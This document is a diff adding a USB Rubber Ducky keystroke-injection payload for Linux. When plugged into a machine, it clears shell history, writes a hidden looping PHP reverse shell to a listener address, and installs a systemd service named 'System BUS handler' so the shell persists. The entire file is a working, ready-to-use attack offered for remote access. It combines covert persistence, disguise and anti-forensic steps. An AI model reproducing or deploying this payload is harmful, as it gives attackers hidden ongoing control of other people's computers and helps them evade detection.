@@ -1,0 +1,41 @@
+REM Title: persistentReverseDuckyLinux
+REM Description: persistentReverseDuckyLinux provides you persistent reverse shell remotely/locally by creating non-root systemd service.
+REM AUTHOR: sx0tt
+REM Version: 1.0
+REM Category: Remote Access
+REM Target: Unix-like operating systems with systemd
+REM Attackmodes: HID
+REM Change IP address and port to reflect your listening host
+
+REM [keeping tracks clear]
+DELAY 500
+CTRL-ALT t
+DELAY 400
+STRING unset HISTFILE && HISTSIZE=0 && rm -f $HISTFILE && unset HISTFILE
+ENTER
+DELAY 100
+
+REM [creating reverse shell]
+STRING mkdir /var/tmp/.system
+ENTER
+DELAY 100
+STRING echo -e "while :\ndo\n\tping -c 5 0.0.0.0\n\tif [ $? -eq 0 ]; then\n\t\tphp -r '\$sock=fsockopen(\"0.0.0.0\",4444);exec("\"/bin/sh -i "<&3 >&3 2>&3"\"");'\n\tfi\ndone" >  /var/tmp/.system/systemBus
+ENTER
+DELAY 100
+STRING chmod +x /var/tmp/.system/systemBus
+ENTER
+DELAY 100
+
+REM [creating non-root systemd service]
+STRING mkdir -p /etc/systemd/system
+ENTER
+DELAY 100
+STRING echo -e "[Unit]\nDescription= System BUS handler\n\n[Service]\nExecStart=/bin/bash /var/tmp/.system/systemBus -no-browser\nRestart=on-failure\nSuccessExitStatus=3 4\nRestartForceExitStatus=3 4\n\n[Install]\nWantedBy=default.target" > /etc/systemd/system/systemBUS.service
+ENTER
+DELAY 100
+
+REM [enabling and starting service]
+STRING systemctl daemon-reload
+ENTER
+STRING systemctl enable --now systemBUS.service
+ENTER
